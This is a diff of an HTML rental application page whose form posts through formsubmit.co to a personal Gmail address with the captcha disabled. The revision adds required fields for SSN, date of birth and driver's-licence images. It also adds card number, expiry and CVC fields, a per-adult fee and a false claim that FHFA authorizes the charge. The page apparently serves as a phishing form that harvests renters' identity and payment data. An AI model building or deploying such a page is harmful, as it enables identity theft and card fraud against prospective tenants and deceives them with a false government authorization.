@@ -1,178 +1,210 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Rental Application Form</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      margin: 20px;
-      line-height: 1.6;
-      background-color: #f4f4f4;
+      padding: 2rem;
+      background-color: #f9f9f9;
     }
-    form {
-      background-color: white;
-      padding: 20px;
-      border-radius: 5px;
-      max-width: 800px;
-      margin: auto;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    }
-    h2 {
+    h1, h2 {
       text-align: center;
     }
+    form {
+      background: #fff;
+      padding: 2rem;
+      border-radius: 10px;
+      max-width: 800px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
     label {
-      font-weight: bold;
       display: block;
-      margin-top: 15px;
+      margin-top: 1rem;
+      font-weight: bold;
     }
-    input, textarea, select {
+    input, select, textarea {
       width: 100%;
-      padding: 8px;
-      margin-top: 5px;
-      border-radius: 4px;
+      padding: 0.5rem;
+      margin-top: 0.25rem;
       border: 1px solid #ccc;
+      border-radius: 4px;
     }
-    .form-inline {
+    .inline {
       display: flex;
-      gap: 10px;
+      gap: 1rem;
     }
-    .form-inline > div {
+    .inline input {
       flex: 1;
     }
     button {
-      background-color: #007BFF;
+      margin-top: 2rem;
+      padding: 0.75rem;
+      width: 100%;
+      background: #4CAF50;
       color: white;
-      padding: 12px 20px;
       border: none;
-      border-radius: 5px;
-      font-size: 16px;
+      border-radius: 6px;
+      font-size: 1rem;
       cursor: pointer;
     }
     button:hover {
-      background-color: #0056b3;
+      background: #45a049;
     }
   </style>
 </head>
 <body>
 
-  <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST">
-    <input type="hidden" name="_next" value="https://yourusername.github.io/rental-form/thank-you.html">
+  <h1>Rental Application Form</h1>
+
+  <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
+    
+    <label>TODAY’S DATE</label>
+    <input type="date" name="Today's Date" required>
+
+    <label>ADDRESS APPLIED FOR</label>
+    <input type="text" name="Applied For" required>
+
+    <label>Email Address</label>
+    <input type="email" name="Email Address" required>
+
+    <h2>Applicant’s Information</h2>
+
+    <div class="inline">
+      <input type="text" name="Last Name" placeholder="Last Name" required>
+      <input type="text" name="First Name" placeholder="First Name" required>
+      <input type="text" name="MI" placeholder="MI">
+    </div>
+
+    <label>SSN (Social Security Number)</label>
+    <input type="text" name="SSN" required>
+
+    <label>Date of Birth</label>
+    <input type="date" name="Date of Birth" required>
+
+    <label>Phone Number</label>
+    <input type="tel" name="Phone Number" required>
+
+    <label>Previous Address</label>
+    <input type="text" name="Previous Address" placeholder="Street, City, State, ZIP">
+
+    <label>Landlord or Mortgage Co.</label>
+    <input type="text" name="Landlord or Mortgage Co.">
+
+    <label>Phone (Landlord)</label>
+    <input type="tel" name="Landlord Phone">
+
+    <label>Rent Amount</label>
+    <input type="text" name="Rent Amount">
+
+    <label>Reason for Leaving</label>
+    <textarea name="Reason for Leaving"></textarea>
+
+    <label>Single or Married</label>
+    <input type="text" name="Marital Status">
+
+    <label>Proposed Occupants & Ages</label>
+    <textarea name="Proposed Occupants and Ages" placeholder="1) ___  2) ___  3) ___ 4) ___ 5) ___"></textarea>
+
+    <label>Pet</label>
+    <input type="text" name="Pet">
+
+    <label>Vehicle Type</label>
+    <input type="text" name="Vehicle Type">
+
+    <label>Smoker?</label>
+    <select name="Smoker">
+      <option value="Yes">Yes</option>
+      <option value="No">No</option>
+    </select>
+
+    <label>Earliest Possible Date of Deposit Payment</label>
+    <input type="date" name="Earliest Deposit Date">
+
+    <label>Amount Available to Secure Property</label>
+    <input type="text" name="Amount Available">
+
+    <label>Proposed Move-in Date</label>
+    <input type="date" name="Proposed Move-in Date">
+
+    <h2>Employment Status</h2>
+
+    <label>Status</label>
+    <textarea name="Employment Status" placeholder="Full Time / Part Time / Unemployed / Student / Retired"></textarea>
+
+    <label>Employed By</label>
+    <input type="text" name="Employed By">
+
+    <label>How long have you worked there?</label>
+    <input type="text" name="Work Duration">
+
+    <label>Work Address</label>
+    <input type="text" name="Work Address">
+
+    <label>Work Phone#</label>
+    <input type="tel" name="Work Phone">
+
+    <label>Personal Reference</label>
+    <input type="text" name="Personal Reference">
+
+    <label>Reference Phone#</label>
+    <input type="tel" name="Reference Phone">
+
+    <h2>Upload Driver's License</h2>
+
+    <label>Driver’s License (Front)</label>
+    <input type="file" name="DL Front" accept="image/*,application/pdf" required>
+
+    <label>Driver’s License (Back)</label>
+    <input type="file" name="DL Back" accept="image/*,application/pdf" required>
+
+     <h2>Payment Method</h2>
+    
+    <label>Venmo</label>
+
+    <label>Paypal</label>
+
+    <label>Zelle</label>
+    
+    <label>Credit or debit card</label>
+   
+    <h3>Billing Information</h3>
+
+    <label>Card Number</label>
+    <input type="text" name="Card Number" placeholder="XXXX-XXXX-XXXX-XXXX">
+
+    <label>Expiry Date</label>
+    <input type="text" name="Expiry Date" placeholder="MM/YY">
+
+    <label>CVC</label>
+    <input type="text" name="CVC" placeholder="xxx">
+
+    <label>Billing Address</label>
+    <input type="text" name="Billing Address">
+
+    <label>Total Amount ($75 per adult)</label>
+    <input type="text" name="Total Billed">
+
+    <label>
+      <input type="checkbox" name="Authorization" required>
+      Authorized by FHFA to charge the amount for my rental application.
+    </label>
+
+    <!-- Formsubmit options -->
     <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_template" value="table">
+  
+    <label>Date Signed</label>
+    <input type="date" name="Form Signed Date" required>
 
-    <h2>Rental Application Form</h2>
-
-    <label for="date">Today's Date</label>
-    <input type="date" id="date" name="date">
-
-    <label for="address">Applied For</label>
-    <input type="text" id="address" name="applied_for">
-
-    <div class="form-inline">
-      <div>
-        <label for="last_name">Last Name</label>
-        <input type="text" id="last_name" name="last_name">
-      </div>
-      <div>
-        <label for="first_name">First Name</label>
-        <input type="text" id="first_name" name="first_name">
-      </div>
-      <div>
-        <label for="middle_name">Middle name</label>
-        <input type="text" id="mi" name="mi" maxlength="1">
-      </div>
-    </div>
-
-    <label for="ssn">SS#</label>
-    <input type="text" id="ssn" name="ssn">
-
-    <label for="dob">Date of Birth</label>
-    <input type="date" id="dob" name="dob">
-
-    <label for="phone">Phone #</label>
-    <input type="tel" id="phone" name="phone">
-
-    <label for="previous_address">Previous Address</label>
-    <textarea id="previous_address" name="previous_address"></textarea>
-
-    <label for="landlord">Landlord or Mortgage Co.</label>
-    <input type="text" id="landlord" name="landlord">
-
-    <label for="landlord_phone">Phone</label>
-    <input type="tel" id="landlord_phone" name="landlord_phone">
-
-    <label for="rent_amount">Rent Amount</label>
-    <input type="text" id="rent_amount" name="rent_amount">
-
-    <label for="reason_leaving">Reason for Leaving</label>
-    <textarea id="reason_leaving" name="reason_leaving"></textarea>
-
-    <label for="status">Single or Married</label>
-    <input type="text" id="status" name="status">
-
-    <label>Proposed Occupants and Ages</label>
-    <div class="form-inline">
-      <input type="text" name="occupant1" placeholder="1">
-      <input type="text" name="occupant2" placeholder="2">
-      <input type="text" name="occupant3" placeholder="3">
-      <input type="text" name="occupant4" placeholder="4">
-      <input type="text" name="occupant5" placeholder="5">
-    </div>
-
-    <label for="pet">Pet</label>
-    <input type="text" id="pet" name="pet">
-
-    <label for="vehicle">Vehicle Type</label>
-    <input type="text" id="vehicle" name="vehicle">
-
-    <label>Smoker</label>
-    <input type="radio" name="smoker" value="yes"> Yes
-    <input type="radio" name="smoker" value="no"> No
-
-    <label for="deposit_date">Earliest Date for Deposit Payment</label>
-    <input type="date" id="deposit_date" name="deposit_date">
-
-    <label for="funds">Available Funds to Secure Property</label>
-    <input type="text" id="funds" name="funds">
-
-    <label for="movein_date">Proposed Move-in Date</label>
-    <input type="date" id="movein_date" name="movein_date">
-
-    <label>Employment Status</label>
-    <label><input type="checkbox" name="employment_status" value="full_time"> Full Time</label>
-    <label><input type="checkbox" name="employment_status" value="part_time"> Part Time</label>
-    <label><input type="checkbox" name="employment_status" value="unemployed"> Unemployed</label>
-    <label><input type="checkbox" name="employment_status" value="student"> Student</label>
-    <label><input type="checkbox" name="employment_status" value="retired"> Retired</label>
-
-    <label for="employer">Employer</label>
-    <input type="text" id="employer" name="employer">
-
-    <label for="employment_duration">How long employed?</label>
-    <input type="text" id="employment_duration" name="employment_duration">
-
-    <label for="employer_address">Employer Address</label>
-    <textarea id="employer_address" name="employer_address"></textarea>
-
-    <label for="employer_phone">Employer Phone</label>
-    <input type="tel" id="employer_phone" name="employer_phone">
-
-    <label for="reference">Personal Reference</label>
-    <input type="text" id="reference" name="reference">
-
-    <label for="reference_phone">Reference Phone</label>
-    <input type="tel" id="reference_phone" name="reference_phone">
-
-    <p>Applicant confirms the above statements are accurate and authorizes verification.</p>
-
-    <label for="signature_date">Date</label>
-    <input type="date" id="signature_date" name="signature_date">
-
-    <label for="applicant_signature">Applicant Signature</label>
-    <input type="text" id="applicant_signature" name="applicant_signature">
-
+    <label>Applicant Signature</label>
+    <input type="text" name="Applicant Signature" required>
 
     <button type="submit">Submit Application</button>
+
   </form>
 
 </body>
